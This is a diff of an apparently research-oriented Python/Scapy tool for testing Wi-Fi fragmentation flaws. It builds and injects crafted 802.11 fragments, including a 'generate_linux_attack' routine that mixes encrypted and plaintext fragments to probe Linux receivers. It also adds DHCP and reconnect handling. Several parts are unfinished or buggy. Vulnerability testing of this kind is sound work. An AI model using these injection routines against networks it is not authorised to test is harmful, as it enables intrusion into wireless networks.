@@ -47,28 +47,17 @@ def argv_pop_argument(argument):
 
 
 class TestOptions():
-	# 1. ============================================================
-	# 1.1 Encrypted (= sanity ping test)
-	# 1.2 Plaintext (= text plaintext injection)
-	# 1.3 Encrpted, Encrypted
-	# 1.4 [TKIP] Encrpted, Encrypted, no global MIC
-	# 1.5 Plaintext, plaintext
-	# 1.6 Encrypted, plaintext
-	# 1.7 Plaintext, encrypted
-	# 1.8 Encrypted, plaintext, encrypted
-	# 1.9 Plaintext, encrypted, plaintext
-	# 2. Test 2 but first plaintext sent before installing key
-	Inject_Ping, ForceFrag_EAPOL, Inject_LargeFrag, Attack_LinuxInject, Inject_Frag = range(5)
-
 	def __init__(self):
 		self.test = None
 		self.interface = None
-		self.tx_before_auth = False
+		self.clientip = None
+		self.routerip = None
 
 
 class MetaFrag():
 	# StartingAuth, AfterAuthRace
-	BeforeAuth, BeforeAuthDone, AfterAuth, AfterConnected = range(4)
+	# AfterObtainedIp: when we (AP) gave the client an IP. Or when we (client) got an IP.
+	BeforeAuth, BeforeAuthDone, AfterAuth, AfterObtainedIp = range(4)
 
 	def __init__(self, frag, trigger, encrypted, inc_pn=1):
 		self.frag = frag
@@ -92,15 +81,12 @@ class TestCase():
 		return frag
 
 class Station():
-	INIT, ATTACKING, DONE = range(3)
-
 	def __init__(self, daemon, mac, ds_status):
 		self.daemon = daemon
 		self.options = daemon.options
-		self.state = Station.INIT
 		self.txed_before_auth = False
 		self.txed_before_auth_done = False
-		self.is_connected = False
+		self.obtained_ip = False
 
 		self.tk = None
 		# TODO: Get the current PN from the kernel, increment by 0x99,
@@ -132,11 +118,12 @@ class Station():
 		pass
 
 	def handle_eth_rx(self, p):
-		if self.state == Station.ATTACKING and self.options.test == TestOptions.Inject_Ping:
-			# TODO XXX --- Make sure this is not a packet send by us!
-			if ARP in p and p[ARP].pdst == self.ip:
-				log(STATUS, "Received reply to (fragmented?) ARP request!", color="green")
-				self.state = Station.DONE
+		print(repr(p))
+
+		# TODO: How to automatically determine a successfull test?
+		# TODO XXX --- Make sure this is not a packet send by us!
+		if ARP in p and p[ARP].pdst == self.ip:
+			log(STATUS, "Received reply to (fragmented?) ARP request!", color="green")
 
 	def set_header(self, p, forward=False, prior=None):
 		"""Set addresses to send frame to the peer or the 3rd party station."""
@@ -157,34 +144,11 @@ class Station():
 		# represents the final destination. Otherwise its the BSSID.
 		p.addr3 = destmac if p.FCfield & 1 else self.mac
 
-
-	def fragattack_linux(self):
-		assert self.tk
-
-		payload1 = b"A" * 16
-		payload2 = b"B" * 16
-		payload3 = b"C" * 16
-		seqnum = 0x8000000
-
-		# Frame 1: encrypted normal fragment
-		frag1 = Dot11(type="Data", FCfield="MF", SC=(seqnum << 4) | 0)/Raw(payload1)
-		self.set_header(frag1)
-		frag1 = encrypt_ccmp(frag1, self.tk, self.pn)
-		self.pn += 1
-
-		# Frame 2: encrypted fragment with different CS but incremental PN.
-		#	   sent fragmented to prevent receiving from processing it.
-		frag2 = Dot11(type="Data", SC=((seqnum ^ 1) << 4) | 1)/Raw(payload2)
-		self.set_header(frag1)
-		frag2 = encrypt_ccmp(frag2, self.tk, self.pn)
-		self.pn += 1
-
-		# Frame 3: plaintext fragment with same CS as the first encrypted fragment
-		frag3 = Dot11(type="Data", SC=(seqnum << 4) | 1)/Raw(payload3)
-		self.set_header(frag1)
-
-		for frag in [frag1, frag2, frag3]:
-			self.daemon.inject_mon(frag)
+	def get_header(self, seqnum=0xAA, **kwargs):
+		"""Generate a default common header that is frequently used"""
+		header = Dot11(type="Data", SC=(seqnum << 4))
+		self.set_header(header, **kwargs)
+		return header
 
 	def create_fragments(self, header, data, num_frags):
 		data = raw(data)
@@ -208,45 +172,43 @@ class Station():
 		self.pn += inc_pn
 		return encrypted
 
-	def send_fragmented(self, header, data, num_frags, tx_repeats=2):
-		frags = self.create_fragments(header, data, num_frags)
-		frags = [self.encrypt(p, inc_pn=1) for i, p in enumerate(frags) \
-				if self.tk and i < 20]
-		for i in range(tx_repeats):
-			for frag in frags:
-				self.daemon.inject_mon(frag)
+	def generate_test_arpping(self, trigger, num_frags=2):
+		header = self.get_header()
+		request = LLC()/SNAP()/ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)
+		frags = self.create_fragments(header, request, num_frags)
 
-	def inject_fragments(self, num_frags=3, size=3000, data=None, prior=None):
-		if data is None:
-			data = b"A" * size
+		test = TestCase()
+		for frag in frags:
+			test.fragments.append(MetaFrag(frag, trigger, False))
 
-		seqnum = 0xAA
-		header = Dot11(type="Data", SC=(seqnum << 4))
-		self.set_header(header, prior=prior)
-		self.send_fragmented(header, data, num_frags)
+		return test
 
-	def inject_eapol(self, numbytes=16, forward=False):
-		# This test is supposed to be executed before authenticating with the AP
-		assert self.tk == None
+	def generate_test_ping(self, trigger, num_frags=2):
+		header = self.get_header()
+		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(b"generate_test_ping")
+		frags = self.create_fragments(header, request, num_frags)
 
-		seqnum = 0xAA
-		header = Dot11(type="Data", SC=(seqnum << 4))
-		self.set_header(header, forward)
-		data = raw(LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A" * num_bytes))
-		self.send_fragmented(header, data, num_frags=1, tx_repeats=2)
+		test = TestCase()
+		for frag in frags:
+			test.fragments.append(MetaFrag(frag, trigger, True))
 
-	def set_preconnect_info(self, ip, peerip):
-		self.ip = ip
-		self.peerip = peerip
+		return test
 
-	def handle_connecting(self, peermac):
-		self.peermac = peermac
+	def generate_test_eapol(self, num_bytes=16, num_frags=1):
+		header = self.get_header()
+		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
+		frags = self.create_fragments(header, request, num_frags)
 
-		seqnum = 0xAA
-		header = Dot11(type="Data", SC=(seqnum << 4))
-		self.set_header(header, prior=2)
+		test = TestCase()
+		for frag in frags:
+			test.fragments.append(MetaFrag(frag), MetaFrag.BeforeAuth, False)
 
-		#request = ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)
+		return test
+
+	def generate_test_eapol_debug(self):
+		"""Here we manually tweak things for ad-hoc tests"""
+
+		header = self.get_header(prior=2)
 		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
 		frag1, frag2 = self.create_fragments(header, data=request, num_frags=2)
 
@@ -254,48 +216,73 @@ class Station():
 		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
 		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"
 
-		# We can now generate the tests --- XXX do this based on the options
-		# TODO: Against Windows 10 / Intel this fails. It seems we cannot interleave
-		#	transmission of fragments of different priority. We should add a test
-		#	case to check if the receiver supports interleaved priority reception.
-		self.test = TestCase()
-		#self.test.fragments.append(MetaFrag(frag1, MetaFrag.BeforeAuthDone, False))
-		#self.test.fragments.append(MetaFrag(frag2copy, MetaFrag.BeforeAuthDone, False))
-		#self.test.fragments.append(MetaFrag(frag2copy, MetaFrag.AfterAuth, False))
-		self.test.fragments.append(MetaFrag(header/LLC()/SNAP()/IP()/ICMP(), MetaFrag.AfterAuth, False))
-		#self.test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))
+		# To generate the tests we need to know the MAC and IP addresses
+
+		test = TestCase()
+		#test.fragments.append(MetaFrag(frag1, MetaFrag.BeforeAuthDone, False))
+		#test.fragments.append(MetaFrag(frag2copy, MetaFrag.BeforeAuthDone, False))
+		#test.fragments.append(MetaFrag(frag2copy, MetaFrag.AfterAuth, False))
+		test.fragments.append(MetaFrag(header/LLC()/SNAP()/IP()/ICMP(), MetaFrag.AfterAuth, False))
+		#test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))
+
+		return test
+
+	def generate_linux_attack(self):
+		test = TestCase()
+		seqnum = 0xAA
+
+		# Frame 1: encrypted normal fragment
+		frag1 = Dot11(type="Data", FCfield="MF", SC=(seqnum << 4) | 0)/Raw(b"A" * 16)
+		self.set_header(frag1)
+		test.fragments.append(MetaFrag(frag1, MetaFrag.AfterAuth, True))
+
+		# Frame 2: encrypted fragment with different CS but incremental PN.
+		#	   sent fragmented to prevent receiving from processing it.
+		frag2 = Dot11(type="Data", SC=((seqnum ^ 1) << 4) | 1)/Raw(b"B" * 16)
+		self.set_header(frag1)
+		test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))
+
+		# Frame 3: plaintext fragment with same CS as the first encrypted fragment
+		frag3 = Dot11(type="Data", SC=(seqnum << 4) | 1)/Raw(b"C" * 16)
+		self.set_header(frag1)
+		test.fragments.append(MetaFrag(frag3, MetaFrag.AfterAuth, False))
+
+		return test
+
+	def generate_tests(self):
+		#self.test = self.generate_test_arpping(MetaFrag.AfterObtainedIp)
+		self.test = self.generate_test_ping(MetaFrag.AfterObtainedIp, num_frags=1)
+		#self.text = self.generate_test_eapol()
+		#self.test = self.generate_test_eapol_debug()
+		#self.test = self.generate_linux_attack()
+		#self.test = TestCase()
+
+		# - Test case to check if the receiver supports interleaved priority
+		#   reception. It seems Windows 10 / Intel might not support this.
+		# - Test case with a very lage aggregated frame (which is normally not
+		#   allowed but some may accept it). And a variation to check how APs
+		#   will forward such overly large frame (e.g. force fragmentation).
+
+		# 1. ============================================================
+		# 1.1 Encrypted (= sanity ping test)
+		# 1.2 Plaintext (= text plaintext injection)
+		# 1.3 Encrpted, Encrypted
+		# 1.4 [TKIP] Encrpted, Encrypted, no global MIC
+		# 1.5 Plaintext, plaintext
+		# 1.6 Encrypted, plaintext
+		# 1.7 Plaintext, encrypted
+		# 1.8 Encrypted, plaintext, encrypted
+		# 1.9 Plaintext, encrypted, plaintext
+		# 2. Test 2 but first plaintext sent before installing key
+
 		log(STATUS, "Constructed test case")
 
-		"""
-		if False == "handle_eapol_tx":
-			# Send the first plaintext fragment before authenticating
-			if self.options.tx_before_auth and not self.txed_before_auth:
-				# XXX inject the frame
-				self.txed_before_auth = True
+	def set_peermac(self, peermac):
+		self.peermac = peermac
 
-			# Test if we can send large EAPOL to force fragmentation through the AP
-			elif self.options == TestOptions.ForceFrag_EAPOL:
-				self.inject_eapol(numbytes=32, forward=False)
-
-		if False == "handle_connected":
-			if self.options.test == TestOptions.Inject_Ping:
-				log(STATUS, "self.mac: " + self.mac)
-				log(STATUS, "self.ip: " + self.ip)
-				log(STATUS, "self.peermac: " + self.peermac)
-				log(STATUS, "self.peerip: " + self.peerip)
-				request = ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)
-
-				self.inject_fragments(num_frags=1, data=LLC()/SNAP()/request, prior=2)
-				#self.daemon.inject_eth(Ether(src=self.mac, dst=self.peermac)/request)
-
-				self.state = Station.ATTACKING
-				log(STATUS, "Transmitted ARP request")
-			#if self.options.test == TestOptions.Inject_Frag:
-			#	self.inject_fragments(num_frags=1, size=16)
-			#elif self.options == TestOptions.Inject_LargeFrag:
-			#	self.inject_fragments(num_frags=3, size=3000)
-		"""
-
+	def handle_connecting(self, peermac):
+		self.set_peermac(peermac)
+		self.generate_tests()
 
 	def inject_next_frags(self, trigger):
 		frag = None
@@ -352,23 +339,32 @@ class Station():
 		daemon.inject_mon(p)
 		print(repr(p))
 
-		# handshake has normally completed, get the keys and inject
-		if is_msg3_or_4:
-			log(STATUS, "MetaFrag.AfterAuth", color="green")
-			self.tk = self.daemon.get_tk(self)
-			self.gtk, self.gtk_idx = self.daemon.get_gtk()
-			self.inject_next_frags(MetaFrag.AfterAuth)
-
 	def handle_authenticated(self):
 		"""Called after completion of the 4-way handshake or similar"""
 
-	def handle_connected(self, ip, peerip):
-		"""Called once the station is fully connected and all IP addresses are known"""
-		self.is_connected = True
+		log(STATUS, "MetaFrag.AfterAuth", color="green")
+		self.tk = self.daemon.get_tk(self)
+		self.gtk, self.gtk_idx = self.daemon.get_gtk()
+		self.inject_next_frags(MetaFrag.AfterAuth)
+
+	def set_ip_address(self, ip, peerip):
 		self.ip = ip
 		self.peerip = peerip
 
-		self.inject_next_frags(MetaFrag.AfterConnected)
+	def handle_obtained_ip(self):
+		"""
+		We are client: called when just authenticated to AP *and* IP addresses known.
+		We are AP: called when client connected and requested IP.
+		"""
+		self.obtained_ip = True
+		self.ip = ip
+		self.peerip = peerip
+
+		# XXX --- RECONNECT AND GENERATE TESTS ?????? XXX
+		self.test = self.generate_test_ping(MetaFrag.AfterObtainedIp, num_frags=2)
+
+		log(STATUS, "MetaFrag.AfterObtainedIp", color="green")
+		self.inject_next_frags(MetaFrag.AfterObtainedIp)
 
 
 class Daemon():
@@ -444,10 +440,7 @@ class Daemon():
 			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
 			raise
 
-		# XXX --- Move to Hostapd --- Configure things for the specific test we are running
-		if self.options.test == TestOptions.ForceFrag_EAPOL or self.options.tx_before_auth:
-			# Intercept EAPOL packets that the client wants to send
-			wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
+		# Post-startup configuration of the supplicant or AP
 		self.configure_daemon()
 
 		# Monitor the virtual monitor interface of the client and perform the needed actions
@@ -501,14 +494,14 @@ class Authenticator(Daemon):
 
 		# Raise event when client is assigned an IP address
 		station = self.stations[clientmac]
-		if DHCP in p and not station.is_connected and clientmac in self.dhcp.leases:
+		if DHCP in p and not station.obtained_ip and clientmac in self.dhcp.leases:
 			req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
 			# This assures we only mark it was connected after receiving a DHCP Request
 			if req_type == 3:
 				# TODO: We should wait a bit until the peer received the DHCP Ack ...
 				peerip = self.dhcp.leases[clientmac]
 				log(STATUS, "Client %s with IP %s has connected" % (clientmac, peerip))
-				station.handle_connected(self.arp_sender_ip, peerip)
+				station.handle_obtained_ip(self.arp_sender_ip, peerip)
 
 		station.handle_eth_rx(p)
 
@@ -522,7 +515,7 @@ class Authenticator(Daemon):
 				clientip = self.dhcp.prealloc_ip(clientmac)
 
 				station = Station(self, self.apmac, "from-DS")
-				station.set_preconnect_info(self.arp_sender_ip, clientip)
+				station.set_ip_address(self.arp_sender_ip, clientip)
 				self.stations[clientmac] = station
 
 			log(STATUS, "Client %s is connecting" % clientmac)
@@ -560,6 +553,9 @@ class Authenticator(Daemon):
 		self.apmac = scapy.arch.get_if_hwaddr(self.nic_iface)
 
 	def configure_daemon(self):
+		# Intercept EAPOL packets that the client wants to send
+		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
+
 		# Let scapy handle DHCP requests
 		self.dhcp = DHCP_sock(sock=self.sock_eth,
 						domain='mathyvanhoef.com',
@@ -580,6 +576,8 @@ class Supplicant(Daemon):
 	def __init__(self, options):
 		super().__init__(options)
 		self.station = None
+		self.arp_sock = None
+		self.requesting_ip = True
 
 	def get_tk(self, station):
 		tk = wpaspy_command(self.wpaspy_ctrl, "GET tk")
@@ -588,36 +586,109 @@ class Supplicant(Daemon):
 		else:
 			return bytes.fromhex(tk)
 
+	def send_dhcp_discover(self):
+		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
+		req = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
+		req = req/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=1337)
+		req = req/DHCP(options=[("message-type","discover"),"end"])
+		self.sock_eth.send(req)
+
+	def send_dhcp_reply(self, offer):
+		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
+		myip = offer[BOOTP].yiaddr
+		sip = offer[BOOTP].siaddr
+		xid = offer[BOOTP].xid
+
+		reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
+		reply = reply/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=1337)
+		reply = reply/DHCP(options=[("message-type", "request"), ("server_id", sip), ("requested_addr", myip),
+					    ("hostname", "fragclient"), "end"])
+		self.sock_eth.send(reply)
+
+	def handle_eth_rx_connect(self, p):
+		"""Handle packets needed to connect and request an IP"""
+
+		# Some functions here may update this variable, so save it locally
+		requesting_ip = self.requesting_ip
+
+		# Handle ARP requests once we have an IP
+		if self.arp_sock:
+			self.arp_sock.reply(p)
+
+		# Check for DHCP response packets if not yet connected
+		if DHCP in p and not self.station.obtained_ip:
+			req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
+
+			# DHCP Offer
+			if req_type == 2:
+				self.send_dhcp_reply(p)
+
+			# DHCP Ack
+			elif req_type == 5:
+				clientip = p[BOOTP].yiaddr
+				serverip = p[IP].src
+				self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.station.ip, ARP_addr=self.station.mac)
+
+				if requesting_ip:
+					self.check_reconnect(clientip, serverip)
+				else:
+					self.station.handle_obtained_ip(clientip, serverip)
+
+		return requesting_ip
+
 	def handle_eth_rx(self, p):
-		# TODO XXX --- Also handle ARP replies?
-
-		# TODO XXX --- Raise connected event when we are assigned an IP address
-		#self.station.handle_connected()
-
-		# TODO XXX --- Request IP address on first connect, remember it, then reconnect
-
-		pass
+		if not self.handle_eth_rx_connect(p):
+			self.station.handle_eth_rx(p)
 
 	def handle_wpaspy(self, msg):
 		log(STATUS, "daemon: " + msg)
 
-		if "Trying to authenticate with" in msg:
+		if "CTRL-EVENT-CONNECTED" in msg:
+			if self.requesting_ip:
+				# TODO: Create a timer in case retransmissions are needed
+				self.send_dhcp_discover()
+			else:
+				self.station.handle_authenticated()
+				self.station.handle_obtained_ip()
+
+		elif "Trying to authenticate with" in msg:
 			p = re.compile("Trying to authenticate with (.*) \(SSID")
 			peermac = p.search(msg).group(1)
-			# XXX on second connect call station.set_preconnect_info(self.arp_sender_ip, clientip)
-			self.station.handle_connecting(peermac)
+			if self.requesting_ip:
+				self.station.set_peermac(peermac)
+			else:
+				self.station.handle_connecting(peermac)
 
-		elif "CTRL-EVENT-CONNECTED" in msg:
-			self.station.handle_authenticated()
+		elif not self.requesting_ip and "EAPOL-TX" in msg:
+			cmd, srcaddr, payload = msg.split()
+			self.station.handle_eapol_tx(bytes.fromhex(payload))
 
-			# TODO: Create a timer in case retransmissions are needed
-			req = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")
-			req = dhcp/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover"),"end"])
-			self.sock_eth.send(req)
+	def check_reconnect(self, clientip, serverip):
+		if not self.requesting_ip:
+			return
 
-		elif "EAPOL-TX" in msg and self.options.test == TestOptions.ForceFrag_EAPOL:
-			# TODO XXX: Get the EAPOL message and send it ourselves (after injecting attack)
-			self.station.handle_eapol_tx(bytes.fromhex(msg.split()[1]))
+		self.requesting_ip = False
+		self.station.set_ip_address(clientip, serverip)
+
+		# TODO: Check that ROAM command always performs a deauthentication
+		log(STATUS, "Obtained IP address, will now reconnect.", color="green")
+		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
+		wpaspy_command(self.wpaspy_ctrl, "ROAM " + self.station.peermac)
+
+	def configure_daemon(self):
+		# TODO: Only enable networks once our script is ready, to prevent
+		#	wpa_supplicant from connecting before our start started.
+
+		# If the user already supplied IPs we can immediately perform tests
+		if self.options.clientip and self.options.routerip:
+			self.requesting_ip = False
+			self.station.set_ip_address(self.options.clientip, self.options.routerip)
+			wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
+
+		# Otherwise we first request an IP using DHCP and then reconnect
+		else:
+			self.requesting_ip = True
+		time.sleep(5)
 
 	def start_daemon(self):
 		log(STATUS, "Starting wpa_supplicant ...")
@@ -649,33 +720,12 @@ if __name__ == "__main__":
 
 	options = TestOptions()
 	options.interface = sys.argv[1]
+	# options.test = TestOptions.Inject_Ping
 
-	if False:
-		# Parse the type of test variant to execute
-		start_ap = argv_pop_argument("--ap")
-		force_frag = argv_pop_argument("--force-frag")
-		inject_largefrag = argv_pop_argument("--largefrag")
-		attack_linux = argv_pop_argument("--attack-linux")
-		if force_frag + inject_largefrag + attack_linux > 1:
-			print("You can only select one test")
-			quit(1)
-		if force_frag:
-			options.test = TestOptions.ForceFrag_EAPOL
-		elif inject_largefrag:
-			options.test = TestOptions.Inject_LargeFrag
-		elif attack_linux:
-			options.test = TestOptions.Attack_LinuxInject
-		else:
-			options.test = TestOptions.Inject_Frag
-
-		# Parse remaining options
-		while argv_pop_argument("--debug"):
-			libwifi.global_log_level -= 1
-
-	else:
-		options.test = TestOptions.Inject_Ping
-		options.tx_before_auth = True
-		start_ap = True
+	# Parse remaining options
+	start_ap = argv_pop_argument("--ap")
+	while argv_pop_argument("--debug"):
+		libwifi.global_log_level -= 1
 
 	# Now start the tests
 	if start_ap:
